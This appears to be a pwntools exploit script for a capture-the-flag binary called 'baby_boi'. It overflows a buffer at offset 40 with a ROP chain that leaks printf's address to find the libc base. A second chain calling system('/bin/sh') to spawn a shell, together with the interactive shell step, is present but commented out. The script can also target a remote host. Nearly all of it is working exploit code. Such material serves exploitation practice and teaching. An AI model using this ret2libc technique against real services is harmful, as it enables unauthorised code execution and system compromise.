from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './baby_boi'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

libc = ELF('./libc-2.27.so')

pop_rdi = next(elf.search(asm('pop rdi; ret')))

io = start()
io.recvuntil('Here I am: ')
printf_addr = int(io.recvline().strip(), 16)

payload = flat({
    40: [
        pop_rdi,
        elf.got.printf,
        elf.plt['printf'],
        elf.sym['main']
    ]
})

io.sendline(payload)
printf1 = u64(io.recv(6) + b'\0\0')# it is the same wow

libc.address = printf_addr - libc.symbols['printf']
print(hex(libc.address))
# payload = flat({
#     40: [
#         # libc.address + 0x4f322
#         # libc.address + 0x439c8,  pop rax ; ret
#         # p64(59),
#         # libc.address + 0x2155f,#pop_rdi,
#         # libc.address + 0x1b3e9a,#bin_sh,
#         # libc.address + 0x1306d9, # pop rdx ; pop rsi ; ret
#         # p64(0),
#         # p64(0),
#         # #libc.address + 0x00000000000008aa, # ret
#         # libc.sym['execve']
#         pop_rdi + 1,
#         pop_rdi,
#         libc.search(b'/bin/sh').__next__(),
#         libc.sym.system
#     ]
# })

# io.sendline(payload)
# io.interactive()

# flag = io.recv()
# success(flag)